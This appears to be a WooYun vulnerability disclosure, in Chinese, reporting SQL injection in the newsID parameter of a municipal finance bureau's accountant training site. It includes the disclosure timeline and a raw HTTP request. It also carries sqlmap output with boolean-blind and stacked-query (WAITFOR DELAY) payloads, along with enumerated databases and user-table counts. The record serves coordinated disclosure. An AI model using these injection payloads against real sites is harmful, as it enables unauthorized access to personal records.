wybug_title: 某市财政局会计人员继续教育sql注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-26：	细节已通知厂商并且等待厂商处理中									2015-12-30：	厂商已经确认，细节仅向厂商公开									2016-01-09：	细节向核心白帽子及相关领域专家公开									2016-01-19：	细节向普通白帽子公开									2016-01-29：	细节向实习白帽子公开									2016-02-12：	细节向公众公开  简要描述： RT 详细说明：  
http://**.**.**.**/

GET /News.aspx?newsID=19 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**Cookie: ASP.NET_SessionId=fbid1qmxqkmoklut0sfyxt0tHost: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*
news参数存在注入
sqlmap resumed the following injection point(s) from stored session:---Parameter: newsID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: newsID=19 AND 3256=3256    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: newsID=19;WAITFOR DELAY '0:0:5'-----web server operating system: Windowsweb application technology: ASP.NET, ASP.NET 4.0.30319back-end DBMS: Microsoft SQL Server 2008current user:    'lcdba'current database:    'LiaoChengDB'current user is DBA:    Falseavailable databases [11]:[*] kjzfd[*] LiaoChengDB[*] master[*] model[*] msdb[*] PowerEducation[*] ReportServer[*] ReportServerTempDB[*] RxEducation2013[*] RxExam2014[*] tempdb
   漏洞证明：  
Database: LiaoChengDB+---------------------------+---------+| Table                     | Entries |+---------------------------+---------+| dbo.Users_b               | 50114   || dbo.Users                 | 49467   || dbo.ChSchool              | 34148   || dbo.FinishUserInformation | 27639   || db_owner.Temp_Choose      | 8739    || db_owner.Temp_Finished    | 6835    || dbo.Users_Temp            | 6694    || db_owner.temp_User        | 4775    || dbo.OperLog               | 165     || dbo.rx_ExtLogs            | 39      || dbo.AreaChSchool          | 19      || dbo.ManageInfo            | 10      || dbo.Notice                | 10      || dbo.Areas                 | 9       || dbo.BxChSchool            | 9       || dbo.Interface             | 6       || dbo.Schools               | 6       || dbo.Infrom                | 1       || dbo.lulu                  | 1       |+---------------------------+---------+

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-30 16:24 厂商回复： CNVD确认所述漏洞情况，已经转由CNCERT下发山东分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
